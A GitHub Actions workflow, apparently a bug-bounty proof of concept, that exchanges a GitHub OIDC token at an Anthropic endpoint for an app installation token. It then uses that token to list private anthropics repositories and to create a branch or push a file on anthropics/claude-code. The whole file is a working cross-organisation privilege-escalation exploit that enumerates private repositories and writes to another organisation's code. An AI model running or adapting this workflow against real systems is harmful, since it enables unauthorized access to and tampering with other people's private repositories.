name: OIDC Token Test
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Prove Cross-Org Scope
        uses: actions/github-script@v7
        with:
          script: |
            const token = await core.getIDToken('claude-code-github-action');
            const resp = await fetch('https://api.anthropic.com/api/github/github-app-token-exchange', {
              method: 'POST',
              headers: { 'Authorization': `Bearer ${token}` }
            });
            const data = await resp.json();
            const T = data.token;
            if (!T) { console.log('No token:', JSON.stringify(data)); return; }
            console.log('Token expires:', data.expires_at);
            
            const gh = async (url, opts = {}) => {
              const r = await fetch(`https://api.github.com${url}`, {
                ...opts,
                headers: { 'Authorization': `Bearer ${T}`, 'Accept': 'application/vnd.github+json', ...(opts.headers || {}) }
              });
              return { status: r.status, data: await r.json().catch(() => null), headers: Object.fromEntries(r.headers) };
            };
            
            // PROOF 1: GET /installation/repositories — full list
            console.log('\n=== PROOF 1: /installation/repositories ===');
            const repos = await gh('/installation/repositories?per_page=100');
            console.log(`Status: ${repos.status}`);
            console.log(`Total count: ${repos.data?.total_count}`);
            if (repos.data?.repositories) {
              for (const r of repos.data.repositories) {
                console.log(`  ${r.full_name} | private=${r.private} | permissions=${JSON.stringify(r.permissions)}`);
              }
            } else {
              console.log(`Response: ${JSON.stringify(repos.data)?.slice(0, 500)}`);
            }
            
            // PROOF 2: List anthropics private repos explicitly
            console.log('\n=== PROOF 2: Anthropics repos (all types) ===');
            const orgRepos = await gh('/orgs/anthropics/repos?type=all&per_page=30&sort=updated');
            console.log(`Status: ${orgRepos.status}`);
            if (orgRepos.data && Array.isArray(orgRepos.data)) {
              for (const r of orgRepos.data) {
                console.log(`  ${r.full_name} | private=${r.private} | default_branch=${r.default_branch}`);
              }
            }
            
            // PROOF 3: Write operation — create a branch on anthropics/claude-code
            console.log('\n=== PROOF 3: Write — create branch on anthropics/claude-code ===');
            // First get the SHA of main
            const mainRef = await gh('/repos/anthropics/claude-code/git/ref/heads/main');
            console.log(`Main ref status: ${mainRef.status}`);
            if (mainRef.data?.object?.sha) {
              const sha = mainRef.data.object.sha;
              console.log(`Main SHA: ${sha}`);
              
              // Create a branch
              const branchName = `security-test-f20-${Date.now()}`;
              const createBranch = await gh('/repos/anthropics/claude-code/git/refs', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ref: `refs/heads/${branchName}`, sha: sha })
              });
              console.log(`Create branch '${branchName}': status=${createBranch.status}`);
              console.log(`Response: ${JSON.stringify(createBranch.data)?.slice(0, 300)}`);
              
              if (createBranch.status === 201) {
                // PROOF: We created a branch on anthropics/claude-code!
                console.log('\n🚨 BRANCH CREATED ON anthropics/claude-code — CROSS-ORG WRITE CONFIRMED');
                
                // Clean up — delete the branch
                const delBranch = await gh(`/repos/anthropics/claude-code/git/refs/heads/${branchName}`, {
                  method: 'DELETE'
                });
                console.log(`Cleanup (delete branch): status=${delBranch.status}`);
              }
            } else {
              console.log(`Cannot read main ref: ${JSON.stringify(mainRef.data)?.slice(0, 200)}`);
              
              // Try alternative write: create a file via contents API
              console.log('\n=== Alternative: PUT file via contents API ===');
              const putFile = await gh('/repos/anthropics/claude-code/contents/SECURITY_TEST_F20.md', {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  message: 'Security test F20 - authorized bounty test, please delete',
                  content: Buffer.from('# Security Test\nThis file was created as part of an authorized HackerOne bug bounty test.\nPlease delete this file.').toString('base64'),
                  branch: 'main'
                })
              });
              console.log(`PUT file: status=${putFile.status}`);
              console.log(`Response: ${JSON.stringify(putFile.data)?.slice(0, 300)}`);
            }
